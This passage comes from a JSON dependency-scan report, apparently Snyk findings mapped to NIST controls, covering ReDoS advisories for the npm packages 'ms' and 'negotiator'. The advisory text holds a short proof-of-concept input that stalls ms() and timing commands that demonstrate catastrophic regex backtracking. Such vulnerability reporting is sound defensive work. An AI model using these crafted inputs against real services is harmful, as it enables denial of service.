0.7.1 or higher.\\n\\n\\n## References\\n\\n- [OSS security Advisory](https://www.openwall.com/lists/oss-security/2016/04/20/11)\\n\\n- [OWASP - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\\n\\n- [Security Focus](https://www.securityfocus.com/bid/96389)\\n\",\n  \"disclosureTime\": \"2015-10-24T20:39:59Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.7.1\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"ms.js\",\n        \"functionName\": \"parse\"\n      },\n      \"version\": [\n        \">0.1.0 <=0.3.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"parse\"\n      },\n      \"version\": [\n        \">0.3.0 <0.7.1\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"ms.js\",\n        \"functionName\": \"parse\"\n      },\n      \"version\": [\n        \">0.1.0 <=0.3.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"parse\"\n      },\n      \"version\": [\n        \">0.3.0 <0.7.1\"\n      ]\n    }\n  ],\n  \"id\": \"npm:ms:20151024\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MS-10064\"\n    ],\n    \"CVE\": [\n      \"CVE-2015-8315\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-3fx5-fwvr-xrjg\"\n    ],\n    \"NSP\": [\n      \"46\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:08.336788Z\",\n  \"moduleName\": \"ms\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ms\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ms:20151024:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.772009Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ms/20151024/ms_20151024_0_0_48701f029417faf65e6f5e0b61a3cebe5436b07b.patch\"\n      ],\n      \"version\": \"=0.7.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ms:20151024:1\",\n      \"modificationTime\": \"2019-12-03T11:40:45.773094Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ms/20151024/ms_20151024_1_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk.patch\"\n      ],\n      \"version\": \"<0.7.0 >=0.6.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ms:20151024:2\",\n      \"modificationTime\": \"2019-12-03T11:40:45.774221Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ms/20151024/ms_20151024_2_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk2.patch\"\n      ],\n      \"version\": \"<0.6.0 >0.3.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ms:20151024:3\",\n      \"modificationTime\": \"2019-12-03T11:40:45.775292Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ms/20151024/ms_20151024_3_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk3.patch\"\n      ],\n      \"version\": \"=0.3.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ms:20151024:4\",\n      \"modificationTime\": \"2019-12-03T11:40:45.776329Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ms/20151024/ms_20151024_4_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk4.patch\"\n      ],\n      \"version\": \"=0.2.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ms:20151024:5\",\n      \"modificationTime\": \"2019-12-03T11:40:45.777474Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ms/20151024/ms_20151024_5_0_48701f029417faf65e6f5e0b61a3cebe5436b07b_snyk5.patch\"\n      ],\n      \"version\": \"=0.1.0\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2015-11-06T02:09:36Z\",\n  \"references\": [\n    {\n      \"title\": \"OSS security Advisory\",\n      \"url\": \"https://www.openwall.com/lists/oss-security/2016/04/20/11\"\n    },\n    {\n      \"title\": \"OWASP - ReDoS\",\n      \"url\": \"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\"\n    },\n    {\n      \"title\": \"Security Focus\",\n      \"url\": \"https://www.securityfocus.com/bid/96389\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.7.1\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"humanize-ms@1.0.1\",\n    \"ms@0.6.2\"\n  ],\n  \"upgradePath\": [],\n  \"isUpgradable\": false,\n  \"isPatchable\": true,\n  \"name\": \"ms\",\n  \"version\": \"0.6.2\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , humanize-ms@1.0.1 , ms@0.6.2 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:ms:20170412",
          "desc": "## Overview\r\n[`ms`](https://www.npmjs.com/package/ms) is a tiny millisecond conversion utility.\r\n\r\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to an incomplete fix for previously reported vulnerability [npm:ms:20151024](https://snyk.io/vuln/npm:ms:20151024). The fix limited the length of accepted input string to 10,000 characters, and turned to be insufficient making it possible to block the event loop for 0.3 seconds (on a typical laptop) with a specially crafted string passed to `ms()` function.\r\n\r\n*Proof of concept*\r\n```js\r\nms = require('ms');\r\nms('1'.repeat(9998) + 'Q') // Takes about ~0.3s\r\n```\r\n\r\n**Note:** Snyk's patch for this vulnerability limits input length to 100 characters. This new limit was deemed to be a breaking change by the author.\r\nBased on user feedback, we believe the risk of breakage is _very_ low, while the value to your security is much greater, and therefore opted to still capture this change in a patch for earlier versions as well.  Whenever patching security issues, we always suggest to run tests on your code to validate that nothing has been broken.\r\n\r\nFor more information on `Regular Expression Denial of Service (ReDoS)` attacks, go to our [blog](https://snyk.io/blog/redos-and-catastrophic-backtracking/).\r\n\r\n## Disclosure Timeline\r\n- Feb 9th, 2017 - Reported the issue to package owner.\r\n- Feb 11th, 2017 - Issue acknowledged by package owner.\r\n- April 12th, 2017 - Fix PR opened by Snyk Security Team.\r\n- May 15th, 2017 - Vulnerability published.\r\n- May 16th, 2017 - Issue fixed and version `2.0.0` released.\r\n- May 21th, 2017 - Patches released for versions `>=0.7.1, <=1.0.0`.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## Remediation\r\nUpgrade `ms` to version 2.0.0 or higher.\r\n\r\n## References\r\n- [GitHub PR](https://github.com/zeit/ms/pull/89)\r\n- [GitHub Commit](https://github.com/zeit/ms/pull/89/commits/305f2ddcd4eff7cc7c518aca6bb2b2d2daad8fef)",
          "impact": 0.3,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MS-10509\"\n  ],\n  \"creationTime\": \"2017-04-12T10:02:45.497000Z\",\n  \"credit\": [\n    \"Snyk Security Research Team\"\n  ],\n  \"cvssScore\": 3.7,\n  \"description\": \"## Overview\\r\\n[`ms`](https://www.npmjs.com/package/ms) is a tiny millisecond conversion utility.\\r\\n\\r\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to an incomplete fix for previously reported vulnerability [npm:ms:20151024](https://snyk.io/vuln/npm:ms:20151024). The fix limited the length of accepted input string to 10,000 characters, and turned to be insufficient making it possible to block the event loop for 0.3 seconds (on a typical laptop) with a specially crafted string passed to `ms()` function.\\r\\n\\r\\n*Proof of concept*\\r\\n```js\\r\\nms = require('ms');\\r\\nms('1'.repeat(9998) + 'Q') // Takes about ~0.3s\\r\\n```\\r\\n\\r\\n**Note:** Snyk's patch for this vulnerability limits input length to 100 characters. This new limit was deemed to be a breaking change by the author.\\r\\nBased on user feedback, we believe the risk of breakage is _very_ low, while the value to your security is much greater, and therefore opted to still capture this change in a patch for earlier versions as well.  Whenever patching security issues, we always suggest to run tests on your code to validate that nothing has been broken.\\r\\n\\r\\nFor more information on `Regular Expression Denial of Service (ReDoS)` attacks, go to our [blog](https://snyk.io/blog/redos-and-catastrophic-backtracking/).\\r\\n\\r\\n## Disclosure Timeline\\r\\n- Feb 9th, 2017 - Reported the issue to package owner.\\r\\n- Feb 11th, 2017 - Issue acknowledged by package owner.\\r\\n- April 12th, 2017 - Fix PR opened by Snyk Security Team.\\r\\n- May 15th, 2017 - Vulnerability published.\\r\\n- May 16th, 2017 - Issue fixed and version `2.0.0` released.\\r\\n- May 21th, 2017 - Patches released for versions `>=0.7.1, <=1.0.0`.\\r\\n\\r\\n## Details\\r\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\r\\n\\r\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\r\\n\\r\\nLet’s take the following regular expression as an example:\\r\\n```js\\r\\nregex = /A(B|C+)+D/\\r\\n```\\r\\n\\r\\nThis regular expression accomplishes the following:\\r\\n- `A` The string must start with the letter 'A'\\r\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\r\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\r\\n\\r\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\r\\n\\r\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\r\\n\\r\\n```bash\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\r\\n0.04s user 0.01s system 95% cpu 0.052 total\\r\\n\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\r\\n1.79s user 0.02s system 99% cpu 1.812 total\\r\\n```\\r\\n\\r\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\r\\n\\r\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\r\\n\\r\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\r\\n1. CCC\\r\\n2. CC+C\\r\\n3. C+CC\\r\\n4. C+C+C.\\r\\n\\r\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\r\\n\\r\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\r\\n\\r\\n| String | Number of C's | Number of steps |\\r\\n| -------|-------------:| -----:|\\r\\n| ACCCX | 3 | 38\\r\\n| ACCCCX | 4 | 71\\r\\n| ACCCCCX | 5 | 136\\r\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\r\\n\\r\\n\\r\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\r\\n\\r\\n\\r\\n## Remediation\\r\\nUpgrade `ms` to version 2.0.0 or higher.\\r\\n\\r\\n## References\\r\\n- [GitHub PR](https://github.com/zeit/ms/pull/89)\\r\\n- [GitHub Commit](https://github.com/zeit/ms/pull/89/commits/305f2ddcd4eff7cc7c518aca6bb2b2d2daad8fef)\",\n  \"disclosureTime\": \"2017-04-11T21:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.0.0\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"parse\"\n      },\n      \"version\": [\n        \">=0.7.3 <2.0.0\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"parse\"\n      },\n      \"version\": [\n        \">=0.7.3 <2.0.0\"\n      ]\n    }\n  ],\n  \"id\": \"npm:ms:20170412\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MS-10509\"\n    ],\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:49.318251Z\",\n  \"moduleName\": \"ms\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ms\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ms:20170412:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.863964Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ms/20170412/ms_100.patch\"\n      ],\n      \"version\": \"=1.0.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ms:20170412:1\",\n      \"modificationTime\": \"2019-12-03T11:40:45.865081Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ms/20170412/ms_072-073.patch\"\n      ],\n      \"version\": \"=0.7.2 || =0.7.3\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:ms:20170412:2\",\n      \"modificationTime\": \"2019-12-03T11:40:45.866206Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/ms/20170412/ms_071.patch\"\n      ],\n      \"version\": \"=0.7.1\"\n    }\n  ],\n  \"proprietary\": true,\n  \"publicationTime\": \"2017-05-15T06:02:45Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/zeit/ms/pull/89/commits/305f2ddcd4eff7cc7c518aca6bb2b2d2daad8fef\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/zeit/ms/pull/89\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=0.7.1 <2.0.0\"\n    ]\n  },\n  \"severity\": \"low\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"low\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongoose@4.2.4\",\n    \"ms@0.7.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongoose@4.10.2\",\n    \"ms@2.0.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"ms\",\n  \"version\": \"0.7.1\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 , ms@0.7.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , debug@2.2.0 , ms@0.7.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , send@0.12.3 , ms@0.7.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , finalhandler@0.3.6 , debug@2.2.0 , ms@0.7.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , send@0.12.3 , debug@2.2.0 , ms@0.7.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 , mquery@1.6.3 , debug@2.2.0 , ms@0.7.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , serve-static@1.9.3 , send@0.12.3 , ms@0.7.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , serve-static@1.9.3 , send@0.12.3 , debug@2.2.0 , ms@0.7.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , ms@0.7.3 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2016-10539"
            ],
            "ghsaid": [
              "7mc5-chhp-fmc3"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:negotiator:20160616",
          "desc": "## Overview\n\n[negotiator](https://npmjs.org/package/negotiator) is an HTTP content negotiator for Node.js.\n\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\nwhen parsing `Accept-Language` http header.\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\n\nUpgrade `negotiator` to version 0.6.1 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/jshttp/negotiator/commit/26a05ec15cf7d1fa56000d66ebe9c9a1a62cb75c)\n\n- [OSWAP Advisory](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [\n    \"SNYK-JS-NEGOTIATOR-10104\"\n  ],\n  \"creationTime\": \"2016-06-16T18:00:02.240000Z\",\n  \"credit\": [\n    \"Adam Baldwin\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n\\n[negotiator](https://npmjs.org/package/negotiator) is an HTTP content negotiator for Node.js.\\n\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\\nwhen parsing `Accept-Language` http header.\\n\\n## Details\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\r\\n\\r\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\r\\n\\r\\nLet’s take the following regular expression as an example:\\r\\n```js\\r\\nregex = /A(B|C+)+D/\\r\\n```\\r\\n\\r\\nThis regular expression accomplishes the following:\\r\\n- `A` The string must start with the letter 'A'\\r\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\r\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\r\\n\\r\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\r\\n\\r\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\r\\n\\r\\n```bash\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\r\\n0.04s user 0.01s system 95% cpu 0.052 total\\r\\n\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\r\\n1.79s user 0.02s system 99% cpu 1.812 total\\r\\n```\\r\\n\\r\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\r\\n\\r\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\r\\n\\r\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\r\\n1. CCC\\r\\n2. CC+C\\r\\n3. C+CC\\r\\n4. C+C+C.\\r\\n\\r\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\r\\n\\r\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\r\\n\\r\\n| String | Number of C's | Number of steps |\\r\\n| -------|-------------:| -----:|\\r\\n| ACCCX | 3 | 38\\r\\n| ACCCCX | 4 | 71\\r\\n| ACCCCCX | 5 | 136\\r\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\r\\n\\r\\n\\r\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\n\\nUpgrade `negotiator` to version 0.6.1 or higher.\\n\\n\\n## References\\n\\n- [GitHub Commit](https://github.com/jshttp/negotiator/commit/26a05ec15cf7d1fa56000d66ebe9c9a1a62cb75c)\\n\\n- [OSWAP Advisory](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)\\n\",\n  \"disclosureTime\": \"2016-06-16T17:36:06Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.6.1\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lib/language.js\",\n        \"functionName\": \"parseLanguage\"\n      },\n      \"version\": [\n        \"<0.6.1\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"lib/language.js\",\n        \"functionName\": \"parseLanguage\"\n      },\n      \"version\": [\n        \"<0.6.1\"\n      ]\n    }\n  ],\n  \"id\": \"npm:negotiator:20160616\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-NEGOTIATOR-10104\"\n    ],\n    \"CVE\": [\n      \"CVE-2016-10539\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-7mc5-chhp-fmc3\"\n    ],\n    